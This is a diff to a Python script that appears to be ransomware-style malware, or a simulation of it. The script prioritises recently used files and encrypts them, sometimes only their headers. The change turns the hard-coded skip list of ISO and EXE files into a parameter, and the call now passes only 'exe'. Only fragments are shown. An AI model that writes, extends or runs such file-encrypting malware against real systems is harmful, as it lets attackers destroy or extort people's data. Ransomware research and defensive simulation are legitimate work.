@@ -33,7 +33,7 @@ ciphers_for_header = {
     },
 }
 
-def priortize_files(directory_to_check):
+def priortize_files(directory_to_check, types_to_ignore=[]):
     """Check files in the specified directory for encryption."""
     # Get recent files
     recent_files_dir = glob.glob(
@@ -70,7 +70,7 @@ def priortize_files(directory_to_check):
             is_recent = filename in recent_files_names
 
             # Check file type and size
-            if file_type not in ["iso", "exe"]:
+            if file_type not in types_to_ignore:
                 to_encrypt = True
                 if is_recent:
                     to_encrypt = True
@@ -236,7 +236,7 @@ def encrypt_files_with_best_cipher(folder_path, encryption_results):
 
 
 directory_to_check = r"files"
-priortized_files, only_header = priortize_files(directory_to_check)
+priortized_files, only_header = priortize_files(directory_to_check, ["exe"])
 
 encryption_results = encrypt_files(priortized_files, only_header)
 
